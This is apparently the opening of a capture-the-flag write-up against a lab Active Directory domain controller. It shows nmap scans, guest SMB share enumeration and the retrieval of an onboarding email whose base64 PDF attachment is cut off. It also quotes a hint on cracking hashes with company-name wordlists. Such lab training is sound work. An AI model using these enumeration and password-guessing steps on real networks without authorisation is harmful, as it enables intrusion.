Target : 10.129.234.63

Date : 01/06/2026

"Should you need to crack a hash, use a short custom wordlist based on company name and simple mutation rules commonly seen in real life passwords (e.g. year and a special character)." is written as an information above the user and root flag submissions.

```bash
>  nmap -sC -sV -Pn -O -p- --min-rate=2500 10.129.234.63  
[sudo] password for vagabond:    
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-01 20:28 +0200  
Nmap scan report for 10.129.234.63  
Host is up (0.086s latency).  
Not shown: 65520 filtered tcp ports (no-response)  
PORT      STATE SERVICE    VERSION  
53/tcp    open  tcpwrapped  
135/tcp   open  tcpwrapped  
139/tcp   open  tcpwrapped  
389/tcp   open  tcpwrapped  
445/tcp   open  tcpwrapped  
636/tcp   open  tcpwrapped  
3268/tcp  open  tcpwrapped  
3269/tcp  open  tcpwrapped  
3389/tcp  open  tcpwrapped  
| rdp-ntlm-info:    
|   Target_Name: PHANTOM  
|   NetBIOS_Domain_Name: PHANTOM  
|   NetBIOS_Computer_Name: DC  
|   DNS_Domain_Name: phantom.vl  
|   DNS_Computer_Name: DC.phantom.vl  
|   DNS_Tree_Name: phantom.vl  
|   Product_Version: 10.0.20348  
|_  System_Time: 2026-06-01T18:29:28+00:00  
| ssl-cert: Subject: commonName=DC.phantom.vl  
| Not valid before: 2026-05-31T18:23:23  
|_Not valid after:  2026-11-30T18:23:23  
|_ssl-date: 2026-06-01T18:30:08+00:00; 0s from scanner time.  
9389/tcp  open  tcpwrapped  
49664/tcp open  tcpwrapped  
49667/tcp open  tcpwrapped  
57630/tcp open  tcpwrapped  
57638/tcp open  tcpwrapped  
58614/tcp open  tcpwrapped  
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port  
Device type: general purpose  
Running (JUST GUESSING): Microsoft Windows 2012|2019|2022 (87%)  
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_server_2022  
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (87%), Microsoft Windows Server 2019 (85%), Microsoft Windows Server 2022 (85%)  
No exact OS matches for host (test conditions non-ideal).  
  
Host script results:  
| smb2-time:    
|   date: 2026-06-01T18:29:29  
|_  start_date: N/A  
| smb2-security-mode:    
|   3.1.1:    
|_    Message signing enabled and required  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 117.86 seconds


>  echo "DC.phantom.vl phantom.vl phantom.htb 10.129.234.63" | sudo tee -a /etc/hosts  
DC.phantom.vl phantom.vl phantom.htb 10.129.234.63
```

After adding the correct hosts to our `/etc/hosts` we re-do a fullport scan, we can already tell by the numbers (`3268,135,88,139,445/tcp`) and by the Domain names that this is an Active Directory box. 

```bash
>  nmap -sC -sV -Pn -O -p- --min-rate=2500 10.129.234.63  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-01 20:35 +0200  
Stats: 0:01:49 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan  
Service scan Timing: About 71.43% done; ETC: 20:37 (0:00:22 remaining)  
Nmap scan report for 10.129.234.63  
Host is up (0.051s latency).  
Not shown: 65514 filtered tcp ports (no-response)  
PORT      STATE SERVICE       VERSION  
53/tcp    open  domain        Simple DNS Plus  
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-01 18:36:08Z)  
135/tcp   open  msrpc         Microsoft Windows RPC  
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: phantom.vl, Site: Default-First-Site-Name)  
445/tcp   open  microsoft-ds?  
464/tcp   open  kpasswd5?  
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
636/tcp   open  tcpwrapped  
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: phantom.vl, Site: Default-First-Site-Name)  
3269/tcp  open  tcpwrapped  
3389/tcp  open  ms-wbt-server Microsoft Terminal Services  
| rdp-ntlm-info:    
|   Target_Name: PHANTOM  
|   NetBIOS_Domain_Name: PHANTOM  
|   NetBIOS_Computer_Name: DC  
|   DNS_Domain_Name: phantom.vl  
|   DNS_Computer_Name: DC.phantom.vl  
|   DNS_Tree_Name: phantom.vl  
|   Product_Version: 10.0.20348  
|_  System_Time: 2026-06-01T18:37:01+00:00  
| ssl-cert: Subject: commonName=DC.phantom.vl  
| Not valid before: 2026-05-31T18:23:23  
|_Not valid after:  2026-11-30T18:23:23  
|_ssl-date: 2026-06-01T18:37:41+00:00; 0s from scanner time.  
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-title: Not Found  
|_http-server-header: Microsoft-HTTPAPI/2.0  
9389/tcp  open  mc-nmf        .NET Message Framing  
49664/tcp open  msrpc         Microsoft Windows RPC  
49667/tcp open  msrpc         Microsoft Windows RPC  
57630/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
57631/tcp open  msrpc         Microsoft Windows RPC  
57638/tcp open  msrpc         Microsoft Windows RPC  
58614/tcp open  msrpc         Microsoft Windows RPC  
58639/tcp open  msrpc         Microsoft Windows RPC  
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port  
Device type: general purpose  
Running (JUST GUESSING): Microsoft Windows 2022|10|11|2012|2016 (89%)  
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016  
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)  
No exact OS matches for host (test conditions non-ideal).  
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-time:    
|   date: 2026-06-01T18:37:04  
|_  start_date: N/A  
| smb2-security-mode:    
|   3.1.1:    
|_    Message signing enabled and required  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 156.18 seconds
```

And here we have the usual suspects of Active Directory (SMB `445/tcp`, LDAP `389/tcp, 3268/tcp`, RPC `135/tcp` and and Kerberos `88/tcp`) as well as `53/tcp` (DNS), `9389/tcp` .NET framing as well as `593/tcp` RPC over HTTP and `5985/tcp` as http "Microsoft HTTPAPI 2.0 (SSDP/UPnP)" .

We start by checking the SMB shares as guest :

```bash
>  nxc smb 10.129.234.63 -u guest -p '' --shares  
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.234.63   445    DC               [+] phantom.vl\guest:    
SMB         10.129.234.63   445    DC               [*] Enumerated shares  
SMB         10.129.234.63   445    DC               Share           Permissions     Remark  
SMB         10.129.234.63   445    DC               -----           -----------     ------  
SMB         10.129.234.63   445    DC               ADMIN$                          Remote Admin  
SMB         10.129.234.63   445    DC               C$                              Default share  
SMB         10.129.234.63   445    DC               Departments Share                    
SMB         10.129.234.63   445    DC               IPC$            READ            Remote IPC  
SMB         10.129.234.63   445    DC               NETLOGON                        Logon server share    
SMB         10.129.234.63   445    DC               Public          READ               
SMB         10.129.234.63   445    DC               SYSVOL                          Logon server share
```

```bash
>  smbclient //10.129.234.63/Public -U guest%  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                   D        0  Thu Jul 11 17:03:14 2024  
 ..                                DHS        0  Thu Aug 14 13:55:49 2025  
 tech_support_email.eml              A    14565  Sat Jul  6 18:08:43 2024  
  
               6127103 blocks of size 4096. 1762632 blocks available  
smb: \> get tech_support_email.eml  
getting file \tech_support_email.eml of size 14565 as tech_support_email.eml (33.2 KiloBytes/sec) (average 33.2 KiloBytes/sec)  
smb: \> exit  
>  cat tech_support_email.eml  
Content-Type: multipart/mixed; boundary="===============6932979162079994354=="  
MIME-Version: 1.0  
From: alucas@phantom.vl  
To: techsupport@phantom.vl  
Date: Sat, 06 Jul 2024 12:02:39 -0000  
Subject: New Welcome Email Template for New Employees  
  
--===============6932979162079994354==  
Content-Type: text/plain; charset="us-ascii"  
MIME-Version: 1.0  
Content-Transfer-Encoding: 7bit  
  
  
Dear Tech Support Team,  
  
I have finished the new welcome email template for onboarding new employees.  
  
Please find attached the example template. Kindly start using this template for all new employees.  
  
Best regards,  
Anthony Lucas  
      
--===============6932979162079994354==  
Content-Type: application/pdf  
MIME-Version: 1.0  
Content-Transfer-Encoding: base64  
Content-Disposition: attachment; filename="welcome_template.pdf"  
  
JVBERi0xLjcKJcOkw7zDtsOfCjIgMCBvYmoKPDwvTGVuZ3RoIDMgMCBSL0ZpbHRlci9GbGF0ZURl  
Y29kZT4+CnN0cmVhbQp4nI1Vy4rcMBC8+yt0zsFTXZYsGcyAJY8hgT0sGcgh5LBksyE5LGRYyO+H  
bnsfM7OeyckvSdVV1dVGLe5vtRkOT78e7r4/uXxTqj8ODjWYXCtSd1Fc7Obr4Uf15YN7rHY3pdp8  
frp7vL873Pf95qZ8HB222zwuux3c4WeV91Vo6+SioPbB7e/dZhIndPuHrz1kK7EH0cAjoAURkRAQ  
0WFARrGnFuP22/5TtdtXt+/jyipum1inY9weOxAZE6JARCiNeAnb/e8LCFxHCKHmKrNoQHqltPCi  
/CjpheeALJ1+lwFBMiICCqIUBN0pSa5xb9YrY6zbE+6yM7mDTK+lLdCqRyZAvYPXb5JANUF0bUNQ  
Lqvk12sBapzUQi5oBVnNp6gjJBvx9P/rTFjFDKk9daZHh0wQMiGovIqpzUaVPbFFy8iExIAJCeNl  
7HYdO6Qz7dGh0c4z1lFdYIcoUQ2f2+HVCWR4DYXMITBndKXuQMIALqe865OMiByUIaKt83qqNp8M  
iOa6VhFQCGZEsT4gkDDZ2w6NrrzMPq6z9/48dYoxx1yDXpYQaMzTm/b3c/DZHXcmy7FvppudJDNr  
VcBqRuZoT9PR/lEiJmO4KK9qyhV/0zpDiWe9xR3HN0xeoq18tDJOks03rdi0t7ir2wVcxsLMcvZC  
vfegOsRRV6Cxu8nun0eIuWm6RUN+HS7P3CGZhQVzT9sIssTNul1xuVvXAM3pTO/tbI/hGJPq35uB  
LqN0aC7jyvrPxMdw1l462BZ7J5DdPD21va/ArP87fMvTmfW1b6DhO/tDRZ33DbYi6Gd1j8f2rfsH  
gCembQplbmRzdHJlYW0KZW5kb2JqCgozIDAgb2JqCjYxNwplbmRvYmoKCjE2IDAgb2JqCjw8L0xl  
bmd0aCAxNyAwIFIvRmlsdGVyL0ZsYXRlRGVjb2RlL0xlbmd0aDEgODQwOD4+CnN0cmVhbQp4nN1Z  
eVwT1/Y/d5ZEXNAIAawsE8JeCEpYCrZYbF1wAQUEtXUJyUCiIZNmBhStYtyq1qWuffiQ1rWWp9Za  
1Grrvis+tetr7etml9/zWWut7WuBDL/PvTMg2uXze//+kHxy5t5zzz3nfL/n3DsoeSp56ApzgQbO  
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  
rCBABRkVQIBycAIPZSCACyQQIRksHXvF37dvHvDgARtwMETVLgAeyqESnGTNn+tyD2hzYAYT9Cef  
/25lMdEQwUHmOWLDDGYY8DtrxT/YJw+GQNKf+O8gKy3AgQQesIANeKggWtOAAwHKgIOhnfLHQS64  
wAomGEV2FkCCanCrM3glxsAF5Z00C0ECHqqIziiwEMx4EMn6zr5MBwvxxkZmMUtcwJMoS6EauD+1  
w6lrLUTGHmDfqoiWg6xJBA48hAEessre4adIVolE4ok/ZQ94wRFWWQhGSsYqgCcZc4AVLOAEJ/FQ  
YZxb3bVUzdh0lZXt7Mb6cSBBBcSD6QHO44yXqbhzZNRNqqBKzQSONQlEsJIoeOIbljByFigFBzjJ  
boo3doKkhdSPEplIPLN25Mqmxob9dJORJBgMlWRPN7GLdyiBoTDydy0qOZM6WcN4OIm/YifbLuKt  
jYwJHfnFWk51JyViJ+HatA5syki1Kzm0EWtJf5Dlsk6VIJFc4pzYVLQVXglghUqCnVJvbmJd+k3m  
LCS/grrOTepGUn2pABFMHZ1H6TvTyT/TfZ2mc//BGUpWq0WA5D9YXfFARd2zgFGrBBvpBEWEueJ9  
faOQ5FQiFeQh2XCo2cRY84TdCn8qCUoKcu3YFEIuQTef7Oq6z/LI+yzgGvq9rtSf8Pi/8cymctFD  
EKwkbGrnd3sVR0IOFJI+UgiRwMEg8oyfEgknc6EIhkE+jIUi8pwDBVAAOZAHRZALg8nafCgADp6A  
fMiDJ8mKXCIrc0NI9eXBeOBgBOQSHWybVytWyRMPM0gVtvNIYaRSmzjD2HMTiZUnEf73eb3H8/a1  
IlljJb0Ia3KEgy7SxS2EUYmEmTxhpIN4piDSubKdxEsHYbjUab5c7SgecHVUWjUIpO4xRxSflDqV  
/g+oPlgPSn9ygJvUo4n45gQTibEckknmRyrvVso7cSys/73/Dn8TtS3cwyyH/wUfjiv4CmVuZHN0  
cmVhbQplbmRvYmoKCjE3IDAgb2JqCjU0MTMKZW5kb2JqCgoxOCAwIG9iago8PC9UeXBlL0ZvbnRE  
ZXNjcmlwdG9yL0ZvbnROYW1lL0JBQUFBQStBcmltb05GLVJlZ3VsYXIKL0ZsYWdzIDQKL0ZvbnRC  
Qm94Wy01NDMgLTM4OSAyNzk2IDEwNDNdL0l0YWxpY0FuZ2xlIDAKL0FzY2VudCA5MjEKL0Rlc2Nl  
bnQgLTIyOAovQ2FwSGVpZ2h0IDEwNDIKL1N0ZW1WIDgwCi9Gb250RmlsZTIgMTYgMCBSCj4+CmVu  
ZG9iagoKMTkgMCBvYmoKPDwvTGVuZ3RoIDQ0MC9GaWx0ZXIvRmxhdGVEZWNvZGU+PgpzdHJlYW0K  
eJxdk8+OmzAQh+9+Ch93DytsY3BWQkhZspE49I9K9wEITFKkjUEOOeTtq5kfbaUeQJ/NzPB5NM6a  
9tDGac2+p3noaNXnKY6JbvM9DaRPdJmisk6P07BuK3kP135RWdMeusdtpWsbz3NVqewHXabbmh76  
aT/OJ3pW2bc0UpriRT99NN2zyrr7snzSleKqjaprPdJZZc2XfvnaXymTrJd2pLhO6+Plo+n+Bfx8  
LKSdrC1Uhnmk29IPlPp4IVUZU+vqeKwVxfG/b36HlNN5+NUnVRlb68qYItSqMk64LJhzcMPswTlz  
AT4yl+ADcxB2hnknHDzzK+rL/h7xO+Y3sGVuwO/MB9SR/XdhL3WOqOlqVVkjnLObhb/nXAt/z7kW  
/p7dLPw9n8vCP5d4+Af2sfAvX5nhX/J/LfxDyQz/IDHwD1Jz8xe3zV/qb/6yv/lznx38A/fTwT/f  
M8O/4JoO/oXEwL/gOm7zZzcH/5x76+DvheGfSx34l/Jf+Hs+i4O/4x46+AfJhX8pMZs/n9dt/tzb  
HP6FlwHbJolHje/CnxHWwz0liqtcGJlbntgp0t87tcwLZ8nzGwLy24gKZW5kc3RyZWFtCmVuZG9i  
agoKMjAgMCBvYmoKPDwvVHlwZS9Gb250L1N1YnR5cGUvVHJ1ZVR5cGUvQmFzZUZvbnQvQkFBQUFB  
K0FyaW1vTkYtUmVndWxhcgovRmlyc3RDaGFyIDAKL0xhc3RDaGFyIDQ4Ci9XaWR0aHNbMCA5NDMg  
NTU2IDIyMiA1MDAgNTU2IDgzMyAyNzcgMjc3IDY2NiA1NTYgNTU2IDU1NiAyNzcgNzIyIDMzMwo1  
ODMgNzIyIDY2NiA4MzMgNjY2IDU4MyA1MDAgMjIyIDU1NiA1MDAgNTAwIDU1NiA1NTYgMjc3IDY2  
NiA3MjIKNTAwIDI3NyA3MjIgNjY2IDcyMiA1NTYgNTU2IDEwMTUgNTU2IDU1NiA2MTAgMjc3IDU1  
NiAyNzcgMjc3IDU1Ngo2MTAgXQovRm9udERlc2NyaXB0b3IgMTggMCBSCi9Ub1VuaWNvZGUgMTkg  
MCBSCj4+CmVuZG9iagoKMjEgMCBvYmoKPDwvRjEgMjAgMCBSCj4+CmVuZG9iagoKMjIgMCBvYmoK  
PDwKL0ZvbnQgMjEgMCBSCi9Qcm9jU2V0Wy9QREYvVGV4dF0KPj4KZW5kb2JqCgoxIDAgb2JqCjw8  
L1R5cGUvUGFnZS9QYXJlbnQgMTUgMCBSL1Jlc291cmNlcyAyMiAwIFIvTWVkaWFCb3hbMCAwIDYx  
MiA3OTJdL1N0cnVjdFBhcmVudHMgMAovQ29udGVudHMgMiAwIFI+PgplbmRvYmoKCjUgMCBvYmoK  
PDwvVHlwZS9TdHJ1Y3RFbGVtCi9TL1N0YW5kYXJkCi9QIDQgMCBSCi9QZyAxIDAgUgovQSA8PC9P  
L0xheW91dC9QbGFjZW1lbnQvQmxvY2sKPj4KL0tbMCBdCj4+CmVuZG9iagoKNiAwIG9iago8PC9U  
eXBlL1N0cnVjdEVsZW0KL1MvU3RhbmRhcmQKL1AgNCAwIFIKL1BnIDEgMCBSCi9BIDw8L08vTGF5  
b3V0L1BsYWNlbWVudC9CbG9jawo+PgovS1sxIF0KPj4KZW5kb2JqCgo3IDAgb2JqCjw8L1R5cGUv  
U3RydWN0RWxlbQovUy9TdGFuZGFyZAovUCA0IDAgUgovUGcgMSAwIFIKL0EgPDwvTy9MYXlvdXQv  
UGxhY2VtZW50L0Jsb2NrCj4+Ci9LWzIgXQo+PgplbmRvYmoKCjggMCBvYmoKPDwvVHlwZS9TdHJ1  
Y3RFbGVtCi9TL1N0YW5kYXJkCi9QIDQgMCBSCi9QZyAxIDAgUgovQSA8PC9PL0xheW91dC9QbGFj  
ZW1lbnQvQmxvY2sKPj4KL0tbMyBdCj4+CmVuZG9iagoKOSAwIG9iago8PC9UeXBlL1N0cnVjdEVs  
ZW0KL1MvU3RhbmRhcmQKL1AgNCAwIFIKL1BnIDEgMCBSCi9BIDw8L08vTGF5b3V0L1BsYWNlbWVu  
dC9CbG9jawo+PgovS1s0IF0KPj4KZW5kb2JqCgoxMCAwIG9iago8PC9UeXBlL1N0cnVjdEVsZW0K  
